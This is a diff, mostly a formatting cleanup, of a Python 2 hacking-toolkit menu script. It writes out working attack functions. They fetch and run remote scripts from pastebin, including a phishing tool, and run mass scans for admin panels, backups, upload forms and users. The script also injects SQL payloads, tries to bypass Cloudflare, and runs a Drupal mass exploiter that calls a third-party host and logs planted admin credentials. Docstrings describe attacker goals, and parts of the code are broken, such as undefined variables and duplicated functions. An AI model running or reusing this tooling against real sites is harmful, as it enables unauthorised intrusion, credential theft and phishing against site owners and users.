         menu()
     elif choice3 == "3":
         fb()
-    else: 
+    else:
         menu()
+
+
 def bluepot():
     print("you need to have at least 1 bluetooh receiver (if you have many it will work wiht those, too). You must install / libbluetooth-dev on Ubuntu / bluez-libs-devel on Fedora/bluez-devel on openSUSE ")
     choice = raw_input("Continue ? Y / N : ")
     if choice in yes:
         os.system("wget https://github.com/andrewmichaelsmith/bluepot/raw/master/bin/bluepot-0.1.tar.gz && tar xfz bluepot-0.1.tar.gz && sudo java -jar bluepot/BluePot-0.1.jar")
-    else : 
+    else:
         menu()
+
+
 def wire():
-    print("""  
-   __                _      _         
-  / _|              (_)    | |        
- | |_ ___  ___   ___ _  ___| |_ _   _ 
+    print("""
+   __                _      _
+  / _|              (_)    | |
+ | |_ ___  ___   ___ _  ___| |_ _   _
  |  _/ __|/ _ \ / __| |/ _ \ __| | | |
  | | \__ \ (_) | (__| |  __/ |_| |_| |
  |_| |___/\___/ \___|_|\___|\__|\__, |
@@ -762,23 +918,27 @@ def wire():
     print("3 : Bluetooth Honeypot GUI Framework \n")
     print("99: Back To The Main Menu \n")
     choice4 = raw_input("-> ")
-    if choice4 =="1":
-     clearScr();reaver()
-    if choice4 =="2":
-        clearScr(); pixiewps()
-    if choice4 =="3":
+    if choice4 == "1":
+        clearScr()
+        reaver()
+    if choice4 == "2":
+        clearScr()
+        pixiewps()
+    if choice4 == "3":
         bluepot()
-    elif choice4 =="99":
+    elif choice4 == "99":
         menu()
     elif choice4 == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def exp():
-    print("""  
-   __                _      _         
-  / _|              (_)    | |        
- | |_ ___  ___   ___ _  ___| |_ _   _ 
+    print("""
+   __                _      _
+  / _|              (_)    | |
+ | |_ ___  ___   ___ _  ___| |_ _   _
  |  _/ __|/ _ \ / __| |/ _ \ __| | | |
  | | \__ \ (_) | (__| |  __/ |_| |_| |
  |_| |___/\___/ \___|_|\___|\__|\__, |
@@ -795,35 +955,44 @@ def exp():
     print("9 : Joomla SQL injection Scanner \n ")
     print("99 : Go Back To Main Menu \n")
     choice5 = raw_input("-> ")
-    if choice5 =="2":
-        clearScr(); sqlmap()
-    if choice5 =="1":
-     os.system('clear'); venom()
-    if choice5 =="3":
-        clearScr(); shellnoob()
-    if choice5 =="4":
-        os.system("clear"); commix()
-    if choice5 =="5":
-        clearScr(); gabriel()
-    if choice5 =="6":
-        clearScr(); jboss()
-    if choice5 =="7":
-        clearScr();bsqlbf()
-    if choice5 =="8":
+    if choice5 == "2":
+        clearScr()
+        sqlmap()
+    if choice5 == "1":
+        os.system('clear')
+        venom()
+    if choice5 == "3":
+        clearScr()
+        shellnoob()
+    if choice5 == "4":
+        os.system("clear")
+        commix()
+    if choice5 == "5":
+        clearScr()
+        gabriel()
+    if choice5 == "6":
+        clearScr()
+        jboss()
+    if choice5 == "7":
+        clearScr()
+        bsqlbf()
+    if choice5 == "8":
         androidhash()
-    if choice5 =="9":
+    if choice5 == "9":
         cmsfew()
-    elif choice5 =="99":
+    elif choice5 == "99":
         menu()
     elif choice5 == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def snif():
-    print("""  
-   __                _      _         
-  / _|              (_)    | |        
- | |_ ___  ___   ___ _  ___| |_ _   _ 
+    print("""
+   __                _      _
+  / _|              (_)    | |
+ | |_ ___  ___   ___ _  ___| |_ _   _
  |  _/ __|/ _ \ / __| |/ _ \ __| | | |
  | | \__ \ (_) | (__| |  __/ |_| |_| |
  |_| |___/\___/ \___|_|\___|\__|\__, |
@@ -835,33 +1004,47 @@ def snif():
     print("4 : SMTP Mailer \n ")
     print("99: Back To Main Menu \n")
     choice6 = raw_input("-> ")
-    if choice6 =="1":
-     clearScr(); setoolkit()
-    if choice6 =="2":
-        clearScr(); ssls()
-    if choice6 =="3":
-        clearScr(); pisher()
-    if choice6 =="4":
-        clearScr(); smtpsend()
-    if choice6 =="99":
-       clearScr(); menu()
+    if choice6 == "1":
+        clearScr()
+        setoolkit()
+    if choice6 == "2":
+        clearScr()
+        ssls()
+    if choice6 == "3":
+        clearScr()
+        pisher()
+    if choice6 == "4":
+        clearScr()
+        smtpsend()
+    if choice6 == "99":
+        clearScr()
+        menu()
     elif choice6 == "":
         menu()
-    else: 
+    else:
         menu()
+
+
 def cmsfew():
     print("your target must be Joomla, Mambo, PHP-Nuke, and XOOPS Only ")
     target = raw_input("Select a target : ")
-    os.system("wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
-    os.system("python cms.py %s"%target)
+    os.system(
+        "wget https://dl.packetstormsecurity.net/UNIX/scanners/cms_few.py.txt -O cms.py")
+    os.system("python cms.py %s" % target)
+
+
 def smtpsend():
     os.system("wget http://pastebin.com/raw/Nz1GzWDS --output-document=smtp.py")
     clearScr()
     os.system("python smtp.py")
+
+
 def pisher():
     os.system("wget http://pastebin.com/raw/DDVqWp4Z --output-document=pisher.py")
     clearScr()
     os.system("python pisher.py")
+
+
 menuu = """
  1) Get all websites
  2) Get joomla websites
@@ -877,62 +1060,69 @@ menuu = """
  12) Bypass Cloudflare
  99) Exit
 """
+
+
 def unique(seq):
     """
     get unique from list found it on stackoverflow
     """
     seen = set()
     return [seen.add(x) or x for x in seq if x not in seen]
-def clearScr() :
+
+
+def clearScr():
     """
-    clear the screen in case of GNU/Linux or 
-    windows 
+    clear the screen in case of GNU/Linux or
+    windows
     """
     if system() == 'Linux':
         os.system('clear')
     if system() == 'Windows':
         os.system('cls')
-class TNscan :  
-    def __init__(self, serverip) :
+
+
+class TNscan:
+    def __init__(self, serverip):
         self.serverip = serverip
         self.getSites(False)
         print menuu
-        while True :
+        while True:
             choice = raw_input(' Enter choice -> ')
-            if choice == '1' :
+            if choice == '1':
                 self.getSites(True)
-            elif choice == '2' :
+            elif choice == '2':
                 self.getJoomla()
-            elif choice == '3' :
+            elif choice == '3':
                 self.getWordpress()
-            elif choice == '4' :
+            elif choice == '4':
                 self.findPanels()
-            elif choice == '5' :
+            elif choice == '5':
                 self.findZip()
-            elif choice == '6' :
+            elif choice == '6':
                 self.findUp()
-            elif choice == '7' :
+            elif choice == '7':
                 self.getUsers()
-            elif choice == '8' :
+            elif choice == '8':
                 self.grabSqli()
-            elif choice == '9' :
+            elif choice == '9':
                 ran = raw_input(' Enter range of ports, (ex : 1-1000) -> ')
                 self.portScanner(1, ran)
-            elif choice == '10' :
+            elif choice == '10':
                 self.portScanner(2, None)
-            elif choice == '11' :
+            elif choice == '11':
                 self.getServerBanner()
-            elif choice == '12' :
+            elif choice == '12':
                 self.cloudflareBypasser()
-            elif choice == '99' :
+            elif choice == '99':
                 menu()
             con = raw_input(' Continue [Y/n] -> ')
-            if con[0].upper() == 'N' :
+            if con[0].upper() == 'N':
                 exit()
-            else :
+            else:
                 clearScr()
                 print menuu
-    def getSites(self, a) :
+
+    def getSites(self, a):
         """
         get all websites on same server
         from bing search
@@ -941,7 +1131,8 @@ class TNscan :
         page = 1
         while page <= 101:
             try:
-                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+&count=50&first=" + str(page)
+                bing = "http://www.bing.com/search?q=ip%3A" + \
+                    self.serverip + "+&count=50&first=" + str(page)
                 openbing = urllib2.urlopen(bing)
                 readbing = openbing.read()
                 findwebs = re.findall('<h2><a href="(.*?)"', readbing)
@@ -954,28 +1145,30 @@ class TNscan :
                         else:
                             findall1[idx] = 'http://' + item + '/'
                     lista.extend(findall1)
-                    
+
                 page += 50
             except urllib2.URLError:
                 pass
         self.sites = unique(lista)
-        if a :      
+        if a:
             clearScr()
             print '[*] Found ', len(lista), ' Website\n'
-            for site in self.sites :
-                print site 
-    def getWordpress(self) :
+            for site in self.sites:
+                print site
+
+    def getWordpress(self):
         """
         get wordpress site using a dork the attacker
-        may do a password list attack (i did a tool for that purpose check my pastebin) 
-        or scan for common vulnerabilities using wpscan for example (i did a simple tool 
+        may do a password list attack (i did a tool for that purpose check my pastebin)
+        or scan for common vulnerabilities using wpscan for example (i did a simple tool
         for multi scanning using wpscan)
         """
         lista = []
         page = 1
         while page <= 101:
             try:
-                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+?page_id=&count=50&first=" + str(page)
+                bing = "http://www.bing.com/search?q=ip%3A" + \
+                    self.serverip + "+?page_id=&count=50&first=" + str(page)
                 openbing = urllib2.urlopen(bing)
                 readbing = openbing.read()
                 findwebs = re.findall('<h2><a href="(.*?)"', readbing)
@@ -989,18 +1182,20 @@ class TNscan :
         lista = unique(lista)
         clearScr()
         print '[*] Found ', len(lista), ' Wordpress Website\n'
-        for site in lista :
+        for site in lista:
             print site
-    def getJoomla(self) :
+
+    def getJoomla(self):
         """
-        get all joomla websites using 
+        get all joomla websites using
         bing search the attacker may bruteforce
-        or scan them 
+        or scan them
         """
         lista = []
         page = 1
         while page <= 101:
-            bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+index.php?option=com&count=50&first=" + str(page)
+            bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + \
+                "+index.php?option=com&count=50&first=" + str(page)
             openbing = urllib2.urlopen(bing)
             readbing = openbing.read()
             findwebs = re.findall('<h2><a href="(.*?)"', readbing)
@@ -1012,74 +1207,81 @@ class TNscan :
         lista = unique(lista)
         clearScr()
         print '[*] Found ', len(lista), ' Joomla Website\n'
-        for site in lista :
+        for site in lista:
             print site
 ############################
-#find admin panels
-    def findPanels(self) :
+# find admin panels
+
+    def findPanels(self):
         """
         find panels from grabbed websites
-        the attacker may do a lot of vulnerabilty 
+        the attacker may do a lot of vulnerabilty
         tests on the admin area
         """
         print "[~] Finding admin panels"
-        adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/', 'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
+        adminList = ['admin/', 'site/admin', 'admin.php/', 'up/admin/', 'central/admin/', 'whm/admin/', 'whmcs/admin/', 'support/admin/', 'upload/admin/', 'video/admin/', 'shop/admin/', 'shoping/admin/', 'wp-admin/', 'wp/wp-admin/', 'blog/wp-admin/', 'admincp/', 'admincp.php/', 'vb/admincp/', 'forum/admincp/', 'up/admincp/', 'administrator/',
+                     'administrator.php/', 'joomla/administrator/', 'jm/administrator/', 'site/administrator/', 'install/', 'vb/install/', 'dimcp/', 'clientes/', 'admin_cp/', 'login/', 'login.php', 'site/login', 'site/login.php', 'up/login/', 'up/login.php', 'cp.php', 'up/cp', 'cp', 'master', 'adm', 'member', 'control', 'webmaster', 'myadmin', 'admin_cp', 'admin_site']
         clearScr()
-        for site in self.sites :
-            for admin in adminList :
-                try :
-                    if urllib.urlopen(site + admin).getcode() == 200 :
+        for site in self.sites:
+            for admin in adminList:
+                try:
+                    if urllib.urlopen(site + admin).getcode() == 200:
                         print " [*] Found admin panel -> ", site + admin
-                except IOError :
+                except IOError:
                     pass
- ############################         
- #find ZIP files          
-    def findZip(self) :
+ ############################
+ # find ZIP files
+
+    def findZip(self):
         """
         find zip files from grabbed websites
         it may contain useful informations
         """
-        zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar', 'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
+        zipList = ['backup.tar.gz', 'backup/backup.tar.gz', 'backup/backup.zip', 'vb/backup.zip', 'site/backup.zip', 'backup.zip', 'backup.rar', 'backup.sql', 'vb/vb.zip', 'vb.zip', 'vb.sql', 'vb.rar',
+                   'vb1.zip', 'vb2.zip', 'vbb.zip', 'vb3.zip', 'upload.zip', 'up/upload.zip', 'joomla.zip', 'joomla.rar', 'joomla.sql', 'wordpress.zip', 'wp/wordpress.zip', 'blog/wordpress.zip', 'wordpress.rar']
         clearScr()
         print "[~] Finding zip file"
-        for site in self.sites :
-            for zip1 in zipList :
+        for site in self.sites:
+            for zip1 in zipList:
                 try:
-                    if urllib.urlopen(site + zip1).getcode() == 200 :
+                    if urllib.urlopen(site + zip1).getcode() == 200:
                         print " [*] Found zip file -> ", site + zip1
-                except IOError :
-                    pass    
-    def findUp(self) :
+                except IOError:
+                    pass
+
+    def findUp(self):
         """
-        find upload forms from grabbed 
-        websites the attacker may succeed to 
+        find upload forms from grabbed
+        websites the attacker may succeed to
         upload malicious files like webshells
         """
-        upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php','blog/up.php', 'upload.php', 'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
+        upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php', 'blog/up.php', 'upload.php',
+                  'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
         clearScr()
         print "[~] Finding Upload"
-        for site in self.sites :
-            for up in upList :
-                try :   
-                    if (urllib.urlopen(site + up).getcode() == 200) :
+        for site in self.sites:
+            for up in upList:
+                try:
+                    if (urllib.urlopen(site + up).getcode() == 200):
                         html = urllib.urlopen(site + up).readlines()
-                        for line in html :
-                            if re.findall('type=file', line) :
-                                print " [*] Found upload -> ", site+up
-                except IOError :
-                    pass           
-    def getUsers(self) :
+                        for line in html:
+                            if re.findall('type=file', line):
+                                print " [*] Found upload -> ", site + up
+                except IOError:
+                    pass
+
+    def getUsers(self):
         """
-        get server users using a method found by 
+        get server users using a method found by
         iranian hackers , the attacker may
-        do a bruteforce attack on CPanel, ssh, ftp or 
+        do a bruteforce attack on CPanel, ssh, ftp or
         even mysql if it supports remote login
         (you can use medusa or hydra)
         """
         clearScr()
         print "[~] Grabbing Users"
         userslist = []
-        for site1 in self.sites :
+        for site1 in self.sites:
             try:
                 site = site1
                 site = site.replace('http://www.', '')
@@ -1089,33 +1291,35 @@ class TNscan :
                     site = site.replace('-', '')
                 site = site.replace('/', '')
                 while len(site) > 2:
-                    resp = urllib2.urlopen(site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
+                    resp = urllib2.urlopen(
+                        site1 + '/cgi-sys/guestbook.cgi?user=%s' % site).read()
                     if 'invalid username' not in resp.lower():
                         print '\t [*] Found -> ', site
                         userslist.append(site)
                         break
-                    else :
+                    else:
                         print site
-                        
+
                     site = site[:-1]
             except:
                 pass
-                    
+
         clearScr()
-        for user in userslist :
+        for user in userslist:
             print user
-    def cloudflareBypasser(self) :
+
+    def cloudflareBypasser(self):
         """
         trys to bypass cloudflare i already wrote
-        in my blog how it works, i learned this 
+        in my blog how it works, i learned this
         method from a guy in madleets
         """
         clearScr()
         print "[~] Bypassing cloudflare"
         subdoms = ['mail', 'webmail', 'ftp', 'direct', 'cpanel']
-        for site in self.sites :
+        for site in self.sites:
             site.replace('http://', '')
-            site.replace('/', '')           
+            site.replace('/', '')
             try:
                 ip = socket.gethostbyname(site)
             except socket.error:
@@ -1128,12 +1332,13 @@ class TNscan :
                     if ddd != ip:
                         print ' [*] Cloudflare bypassed -> ', ddd
                         break
-                except socket.error :
-                    pass         
-    def getServerBanner(self) :
+                except socket.error:
+                    pass
+
+    def getServerBanner(self):
         """
-        simply gets the server banner 
-        the attacker may benefit from it 
+        simply gets the server banner
+        the attacker may benefit from it
         like getting the server side software
         """
         clearScr()
@@ -1142,17 +1347,19 @@ class TNscan :
             httpresponse = urllib.urlopen(s)
             print ' [*] Server header -> ', httpresponse.headers.getheader('server')
         except:
-            pass        
-    def grabSqli(self) :
+            pass
+
+    def grabSqli(self):
         """
-        just grabs all websites in server with php?id= dork 
+        just grabs all websites in server with php?id= dork
         for scanning for error based sql injection
         """
         page = 1
         lista = []
         while page <= 101:
             try:
-                bing = "http://www.bing.com/search?q=ip%3A" + self.serverip + "+php?id=&count=50&first=" + str(page)
+                bing = "http://www.bing.com/search?q=ip%3A" + \
+                    self.serverip + "+php?id=&count=50&first=" + str(page)
                 openbing = urllib2.urlopen(bing)
                 readbing = openbing.read()
                 findwebs = re.findall('<h2><a href="(.*?)"', readbing)
@@ -1160,22 +1367,25 @@ class TNscan :
                     x = findwebs[i]
                     lista.append(x)
             except:
-                pass            
-            page += 50  
-        lista = unique(lista)       
+                pass
+            page += 50
+        lista = unique(lista)
         self.checkSqli(lista)
+
     def checkSqli(self, s):
         """
         checks for error based sql injection,
-        most of the codes here are from webpwn3r 
-        project the one who has found an lfi in 
-        yahoo as i remember, you can find a separate 
-        tool in my blog 
+        most of the codes here are from webpwn3r
+        project the one who has found an lfi in
+        yahoo as i remember, you can find a separate
+        tool in my blog
         """
         clearScr()
         print "[~] Checking SQL injection"
-        payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
-        check = re.compile("Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
+        payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><",
+                    "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
+        check = re.compile(
+            "Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
         for url in s:
             try:
                 for param in url.split('?')[1].split('&'):
@@ -1185,36 +1395,41 @@ class TNscan :
                         html = urllib2.urlopen(power).readlines()
                         for line in html:
                             checker = re.findall(check, line)
-                            if len(checker) != 0 :
+                            if len(checker) != 0:
                                 print ' [*] SQLi found -> ', power
             except:
-                pass  
-def portScanner(self, mode, ran) :
-        """
-        simple port scanner works with range of ports 
-        or with common ports (al-swisre idea)
-        """
-        clearScr()
-        print "[~] Scanning Ports"
-        def do_it(ip, port):
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                pass
 
-            sock = sock.connect_ex((ip,port))
-            if sock == 0:
-                print " [*] Port %i is open" % port 
-        
-        if mode == 1 :
-            a = ran.split('-')
-            start = int(a[0])
-            end = int(a[1])
-            for i in range(start, end):
-                do_it(self.serverip, i)
-        elif mode == 2 :
-            for port in [80,21,22,2082,25,53,110,443,143] :
 
-                do_it(self.serverip, port)
+def portScanner(self, mode, ran):
+    """
+    simple port scanner works with range of ports
+    or with common ports (al-swisre idea)
+    """
+    clearScr()
+    print "[~] Scanning Ports"
+
+    def do_it(ip, port):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        sock = sock.connect_ex((ip, port))
+        if sock == 0:
+            print " [*] Port %i is open" % port
+
+    if mode == 1:
+        a = ran.split('-')
+        start = int(a[0])
+        end = int(a[1])
+        for i in range(start, end):
+            do_it(self.serverip, i)
+    elif mode == 2:
+        for port in [80, 21, 22, 2082, 25, 53, 110, 443, 143]:
+
+            do_it(self.serverip, port)
+
+
 ############################
-minu ='''
+minu = '''
 \t 1: Drupal Bing Exploiter
 \t 2: Get Drupal Websites
 \t 3: Drupal Mass Exploiter
@@ -1222,115 +1437,130 @@ minu ='''
 '''
 
 
-             
 def drupal():
-
     '''Drupal Exploit Binger All Websites Of server '''
-    ip  = raw_input('1- IP : ')
-    page  = 1
-    while page <= 50 :
-      
-      url   = "http://www.bing.com/search?q=ip%3A"+ip+"&go=Valider&qs=n&form=QBRE&pq=ip%3A"+ip+"&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first="+str(page)
-      req   = urllib2.Request(url)
-      opreq = urllib2.urlopen(req).read()
-      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
-      page += 1 
-      
-      for url in findurl :
-        try : 
-            
-                        urlpa = urlparse(url)
-                        site  = urlpa.netloc
+    ip = raw_input('1- IP : ')
+    page = 1
+    while page <= 50:
 
-                        print "[+] Testing At "+site
-                        resp = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+site+'&submit=submit')
-                        read=resp.read()
-                        if "User : HolaKo" in read:
-                           print "Exploit found =>"+site
+        url = "http://www.bing.com/search?q=ip%3A" + ip + "&go=Valider&qs=n&form=QBRE&pq=ip%3A" + \
+            ip + "&sc=0-0&sp=-1&sk=&cvid=af529d7028ad43a69edc90dbecdeac4f&first=" + \
+            str(page)
+        req = urllib2.Request(url)
+        opreq = urllib2.urlopen(req).read()
+        findurl = re.findall(
+            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
+        page += 1
 
-                           print "user:HolaKo\npass:admin"
-                           a = open('up.txt','a')
-                           a.write(site+'\n')
-                           a.write("user:"+user+"\npass:"+pwd+"\n")
-                        else :
-                           print "[-] Expl Not Found :( "
+        for url in findurl:
+            try:
 
-        except Exception as ex :
-                       print ex
-                       sys.exit(0)
+                urlpa = urlparse(url)
+                site = urlpa.netloc
+
+                print "[+] Testing At " + site
+                resp = urllib2.urlopen(
+                    'http://crig-alda.ro/wp-admin/css/index2.php?url=' + site + '&submit=submit')
+                read = resp.read()
+                if "User : HolaKo" in read:
+                    print "Exploit found =>" + site
+
+                    print "user:HolaKo\npass:admin"
+                    a = open('up.txt', 'a')
+                    a.write(site + '\n')
+                    a.write("user:" + user + "\npass:" + pwd + "\n")
+                else:
+                    print "[-] Expl Not Found :( "
+
+            except Exception as ex:
+                print ex
+                sys.exit(0)
+
+        # Drupal Server ExtraCtor
 
 
-            #Drupal Server ExtraCtor
 def getdrupal():
-    ip  = raw_input('Enter The Ip ->  ')
-    page  = 1
+    ip = raw_input('Enter The Ip ->  ')
+    page = 1
     sites = list()
-    while page <= 50 :
-      
-      url   = "http://www.bing.com/search?q=ip%3A"+ip+"+node&go=Valider&qs=ds&form=QBRE&first="+str(page)
-      req   = urllib2.Request(url)
-      opreq = urllib2.urlopen(req).read()
-      findurl = re.findall('<div class="b_title"><h2><a href="(.*?)" h=',opreq)
-      page += 1 
-      
-      for url in findurl :
-                             split = urlparse(url)
-                             site   = split.netloc
-                             if site not in sites :
-                                      print site 
-                                      sites.append(site)
-      
+    while page <= 50:
 
-            #Drupal Mass List Exploiter 
+        url = "http://www.bing.com/search?q=ip%3A" + ip + \
+            "+node&go=Valider&qs=ds&form=QBRE&first=" + str(page)
+        req = urllib2.Request(url)
+        opreq = urllib2.urlopen(req).read()
+        findurl = re.findall(
+            '<div class="b_title"><h2><a href="(.*?)" h=', opreq)
+        page += 1
+
+        for url in findurl:
+            split = urlparse(url)
+            site = split.netloc
+            if site not in sites:
+                print site
+                sites.append(site)
+
+        # Drupal Mass List Exploiter
+
+
 def drupallist():
     listop = raw_input("Enter The list Txt -> ")
-    fileopen = open(listop,'r')
-    content = fileopen.readlines() 
-    for i in content :
-        url=i.strip()
-        try :
-            openurl = urllib2.urlopen('http://crig-alda.ro/wp-admin/css/index2.php?url='+url+'&submit=submit')
+    fileopen = open(listop, 'r')
+    content = fileopen.readlines()
+    for i in content:
+        url = i.strip()
+        try:
+            openurl = urllib2.urlopen(
+                'http://crig-alda.ro/wp-admin/css/index2.php?url=' + url + '&submit=submit')
             readcontent = openurl.read()
-            if  "Success" in readcontent :
-                print "[+]Success =>"+url
+            if "Success" in readcontent:
+                print "[+]Success =>" + url
                 print "[-]username:HolaKo\n[-]password:admin"
-                save = open('drupal.txt','a')
-                save.write(url+"\n"+"[-]username:HolaKo\n[-]password:admin\n")
-                               
-            else : 
-                print i + "=> exploit not found " 
-        except Exception as ex :
+                save = open('drupal.txt', 'a')
+                save.write(
+                    url + "\n" + "[-]username:HolaKo\n[-]password:admin\n")
+
+            else:
+                print i + "=> exploit not found "
+        except Exception as ex:
             print ex
+
+
 def maine():
-    
-     print minu
-     choose = raw_input("choose a number -> ")
-     while True : 
-      
-      if choose == "1": 
-        drupal()
-      if choose == "2":
-        getdrupal()
-      if choose == "3":
-        drupallist()
-      if choose == "4":
-        about()
-      if choose == "99":
+
+    print minu
+    choose = raw_input("choose a number -> ")
+    while True:
+
+        if choose == "1":
+            drupal()
+        if choose == "2":
+            getdrupal()
+        if choose == "3":
+            drupallist()
+        if choose == "4":
+            about()
+        if choose == "99":
             menu()
-      con = raw_input('Continue [Y/n] -> ')
-      if con[0].upper() == 'N' :
-                                    exit()
-      if con[0].upper() == 'Y' :
-                                    maine()
+        con = raw_input('Continue [Y/n] -> ')
+        if con[0].upper() == 'N':
+            exit()
+        if con[0].upper() == 'Y':
+            maine()
+
+
 def unique(seq):
     seen = set()
     return [seen.add(x) or x for x in seq if x not in seen]
+
+
 def bing_all_grabber(s):
     lista = []
     page = 1
     while page <= 101:
         try:
-            bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
+            bing = "http://www.bing.com/search?q=ip%3A" + \
+                s + "+&count=50&first=" + str(page)
             openbing = urllib2.urlopen(bing)
             readbing = openbing.read()
             findwebs = re.findall('<h2><a href="(.*?)"', readbing)
@@ -1350,50 +1580,59 @@ def bing_all_grabber(s):
 
     final = unique(lista)
     return final
-def check_wordpress(sites) :
+
+
+def check_wordpress(sites):
     wp = []
-    for site in sites :
-        try :
-            if urllib2.urlopen(site+'wp-login.php').getcode() == 200 :
+    for site in sites:
+        try:
+            if urllib2.urlopen(site + 'wp-login.php').getcode() == 200:
                 wp.append(site)
-        except :
+        except:
             pass
 
     return wp
-def check_joomla(sites) :
+
+
+def check_joomla(sites):
     joomla = []
-    for site in sites :
-        try :
-            if urllib2.urlopen(site+'administrator').getcode() == 200 :
+    for site in sites:
+        try:
+            if urllib2.urlopen(site + 'administrator').getcode() == 200:
                 joomla.append(site)
-        except :
+        except:
             pass
 
     return joomla
+
+
 def wppjmla():
-    
+
     ipp = raw_input('Enter Target IP -> ')
     sites = bing_all_grabber(str(ipp))
     wordpress = check_wordpress(sites)
     joomla = check_joomla(sites)
-    for ss in wordpress :
+    for ss in wordpress:
         print ss
     print '[+] Found ! ', len(wordpress), ' Wordpress Websites'
-    print '-'*30+'\n'
-    for ss in joomla :
+    print '-' * 30 + '\n'
+    for ss in joomla:
         print ss
-
 
     print '[+] Found ! ', len(joomla), ' Joomla Websites'
 
     print '\n'
-#initialise the tnscan function 
+# initialise the tnscan function
+
+
 class tnn():
     def __init__(self):
         clearScr()
         aaa = raw_input("Target IP -> ")
         TNscan(aaa)
 ############################
+
+
 class bcolors:
     HEADER = ''
     OKBLUE = ''
@@ -1402,6 +1641,8 @@ class bcolors:
     FAIL = ''
     ENDC = ''
     CYAN = ''
+
+
 class colors():
     PURPLE = ''
     CYAN = ''
@@ -1412,46 +1653,57 @@ class colors():
     RED = ''
     BOLD = ''
     ENDC = ''
+
+
 def grabsqli(ip):
-    try :
-        print bcolors.OKBLUE  + "Check_Uplaod... "
+    try:
+        print bcolors.OKBLUE + "Check_Uplaod... "
         print '\n'
 
         page = 1
         while page <= 21:
-                bing = "http://www.bing.com/search?q=ip%3A"+ip+"+upload&count=50&first="+str(page)
-                openbing  = urllib2.urlopen(bing)
-                readbing = openbing.read()
-                findwebs = re.findall('<h2><a href="(.*?)"' , readbing)
-                sites = findwebs
-                for i in sites :
-                            try :
-                                      response = urllib2.urlopen(i).read()                                   
-                                      checksqli(i)  
-                            except urllib2.HTTPError, e:
-                                       str(sites).strip(i)
-                                   
-                page = page + 10 
-    except : 
-         pass 
+            bing = "http://www.bing.com/search?q=ip%3A" + \
+                ip + "+upload&count=50&first=" + str(page)
+            openbing = urllib2.urlopen(bing)
+            readbing = openbing.read()
+            findwebs = re.findall('<h2><a href="(.*?)"', readbing)
+            sites = findwebs
+            for i in sites:
+                try:
+                    response = urllib2.urlopen(i).read()
+                    checksqli(i)
+                except urllib2.HTTPError, e:
+                    str(sites).strip(i)
+
+            page = page + 10
+    except:
+        pass
+
+
 def checksqli(sqli):
-                            responsetwo = urllib2.urlopen(sqli).read()
-                            find = re.findall('type="file"',responsetwo)
-                            if find:
-                                            print(" Found ==> " + sqli)
-def sqlscan():                                           
+    responsetwo = urllib2.urlopen(sqli).read()
+    find = re.findall('type="file"', responsetwo)
+    if find:
+        print(" Found ==> " + sqli)
+
+
+def sqlscan():
     ip = raw_input('Enter IP -> ')
     grabsqli(ip)
+
 
 def unique(seq):
     seen = set()
     return [seen.add(x) or x for x in seq if x not in seen]
+
+
 def bing_all_grabber(s):
     lista = []
     page = 1
     while page <= 101:
         try:
-            bing = "http://www.bing.com/search?q=ip%3A" + s + "+&count=50&first=" + str(page)
+            bing = "http://www.bing.com/search?q=ip%3A" + \
+                s + "+&count=50&first=" + str(page)
             openbing = urllib2.urlopen(bing)
             readbing = openbing.read()
             findwebs = re.findall('<h2><a href="(.*?)"', readbing)
@@ -1471,66 +1723,80 @@ def bing_all_grabber(s):
 
     final = unique(lista)
     return final
-def check_wordpress(sites) :
+
+
+def check_wordpress(sites):
     wp = []
-    for site in sites :
-        try :
-            if urllib2.urlopen(site+'wp-login.php').getcode() == 200 :
+    for site in sites:
+        try:
